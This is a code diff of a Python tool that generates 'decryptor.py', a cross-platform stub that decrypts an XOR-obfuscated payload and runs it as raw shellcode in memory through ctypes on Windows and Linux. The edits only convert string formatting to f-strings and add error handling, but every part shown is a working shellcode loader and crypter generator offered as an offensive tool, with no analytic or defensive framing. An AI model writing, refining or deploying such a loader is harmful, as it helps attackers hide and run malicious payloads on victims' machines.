@@ -47,7 +47,7 @@ def execute_windows(shellcode):
         func = ctypes.cast(buffer, ctypes.CFUNCTYPE(None))
         func()
     except Exception as e:
-        print("[!] Windows execution failed: {0}".format(e))
+        print(f"[!] Windows execution failed: {e}")
         sys.exit(1)
 
 def execute_linux(shellcode):
@@ -62,46 +62,50 @@ def execute_linux(shellcode):
         function = ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes_buffer))
         function()
     except Exception as e:
-        print("[!] Linux execution failed: {0}".format(e))
+        print(f"[!] Linux execution failed: {e}")
         sys.exit(1)
 
 if __name__ == "__main__":
-    print("[*] Starting cross-platform payload executor")
-    print("[*] Detected OS: {0}".format(platform.system()))
+    print(f"[*] Starting cross-platform payload executor")
+    print(f"[*] Detected OS: {platform.system()}")
 
     try:
         decrypted = decrypt_payload()
-        print("[+] Payload decrypted ({0} bytes)".format(len(decrypted)))
+        print(f"[+] Payload decrypted ({len(decrypted)} bytes)")
 
         if platform.system() == "Windows":
             execute_windows(decrypted)
         elif platform.system() == "Linux":
             execute_linux(decrypted)
         else:
-            print("[!] Unsupported OS: {0}".format(platform.system()))
+            print(f"[!] Unsupported OS: {platform.system()}")
             sys.exit(1)
 
     except Exception as e:
-        print("[!] Critical error: {0}".format(e))
+        print(f"[!] Critical error: {e}")
         print("[*] Decrypted payload saved to 'decrypted.bin'")
         sys.exit(1)
 '''
 
 
 def generate_decryptor(encrypted_file, obfuscated_key_hex, xor_key_hex):
-    with open("decryptor.py", "w") as f:
-        f.write(STUB_TEMPLATE.format(
-            obfuscated_key_hex=obfuscated_key_hex,
-            xor_key_hex=xor_key_hex,
-            encrypted_file=encrypted_file
-        ))
+    try:
+        with open("decryptor.py", "w") as f:
+            content = STUB_TEMPLATE.replace("{obfuscated_key_hex}", obfuscated_key_hex) \
+                .replace("{xor_key_hex}", xor_key_hex) \
+                .replace("{encrypted_file}", encrypted_file)
+            f.write(content)
 
-    # Make executable on Linux
-    if platform.system() == "Linux":
-        import os
-        os.chmod("decryptor.py", 0o755)
+        # Make executable on Linux
+        if platform.system() == "Linux":
+            import os
+            os.chmod("decryptor.py", 0o755)
 
-    print("[+] Cross-platform decryptor generated:")
-    print("    - File: decryptor.py")
-    print("    - XOR Key: {0}".format(xor_key_hex))
-    print("    - Target: {0}".format(encrypted_file))
+        print("[+] Cross-platform decryptor generated:")
+        print(f"    - File: decryptor.py")
+        print(f"    - XOR Key: {xor_key_hex}")
+        print(f"    - Target: {encrypted_file}")
+        return True
+    except Exception as e:
+        print(f"[!] Error generating decryptor: {e}")
+        return False
